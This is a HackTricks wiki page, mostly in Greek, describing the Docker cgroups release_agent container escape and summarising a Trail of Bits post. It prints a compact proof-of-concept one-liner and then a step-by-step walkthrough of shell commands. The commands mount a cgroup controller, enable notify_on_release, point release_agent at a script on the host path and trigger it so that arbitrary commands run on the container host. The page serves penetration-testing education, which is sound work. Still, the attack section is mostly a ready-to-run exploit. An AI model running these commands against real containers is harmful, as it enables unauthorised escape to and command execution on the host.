# Docker release\_agent cgroups escape

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**Για περισσότερες λεπτομέρειες, ανατρέξτε στην** [**αρχική ανάρτηση του blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Αυτό είναι απλώς μια περίληψη:

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Η απόδειξη της έννοιας (PoC) δείχνει μια μέθοδο εκμετάλλευσης των cgroups δημιουργώντας ένα αρχείο `release_agent` και ενεργοποιώντας την εκτέλεσή του για να εκτελέσει αυθαίρετες εντολές στον οικοδεσπότη του κοντέινερ. Ακολουθεί μια ανάλυση των βημάτων που εμπλέκονται:

1. **Προετοιμάστε το Περιβάλλον:**
* Δημιουργείται ένας φάκελος `/tmp/cgrp` για να χρησιμεύσει ως σημείο προσάρτησης για το cgroup.
* Ο ελεγκτής cgroup RDMA προσαρτάται σε αυτόν τον φάκελο. Σε περίπτωση απουσίας του ελεγκτή RDMA, προτείνεται η χρήση του ελεγκτή cgroup `memory` ως εναλλακτική.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Ρύθμιση του Παιδικού Cgroup:**
* Ένα παιδικό cgroup με όνομα "x" δημιουργείται μέσα στον προσαρτημένο κατάλογο cgroup.
* Οι ειδοποιήσεις ενεργοποιούνται για το cgroup "x" γράφοντας 1 στο αρχείο notify\_on\_release του.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Ρύθμιση του Release Agent:**
* Η διαδρομή του κοντέινερ στον οικοδεσπότη αποκτάται από το αρχείο /etc/mtab.
* Το αρχείο release\_agent του cgroup ρυθμίζεται στη συνέχεια για να εκτελεί ένα σενάριο με όνομα /cmd που βρίσκεται στη ληφθείσα διαδρομή του οικοδεσπότη.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Δημιουργία και Ρύθμιση του Script /cmd:**
* Το script /cmd δημιουργείται μέσα στο κοντέινερ και ρυθμίζεται να εκτελεί ps aux, ανακατευθύνοντας την έξοδο σε ένα αρχείο με όνομα /output στο κοντέινερ. Ο πλήρης δρόμος του /output στον κεντρικό υπολογιστή καθορίζεται.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Ενεργοποίηση της Επίθεσης:**
* Μια διαδικασία ξεκινά εντός του "x" child cgroup και τερματίζεται αμέσως.
* Αυτό ενεργοποιεί τον `release_agent` (το σενάριο /cmd), το οποίο εκτελεί ps aux στον host και γράφει την έξοδο στο /output εντός του container.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
